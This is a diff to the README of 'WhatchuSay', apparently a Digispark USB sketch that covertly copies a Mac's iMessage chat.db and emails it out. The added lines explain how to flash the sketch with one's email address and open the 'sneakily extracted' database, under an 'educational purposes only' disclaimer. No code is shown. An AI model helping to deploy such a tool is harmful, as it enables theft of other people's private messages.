@@ -16,7 +16,13 @@ Edit the WhatchuSay.ino file at the part in which is says <email_address>, put y
 ```
 # Opening chat.db
 ```
-To open the file you such sneakily extracted, use SQLite3, or any sql for that matter. 
+To open the file you such sneakily extracted, use SQLite3, or any sql for that matter.
+```
+# setup
+```
+1. Using arduino, compile the ino file (sketch) onto your digispark (after editing the sketch with your email). 
+2. Good to go!
+
 ```
 
 ** EDUCATIONAL PURPOSES ONLY, I AM NOT RESPONSIBLE FOR ANY DATA TAKEN or DESTROYED! **
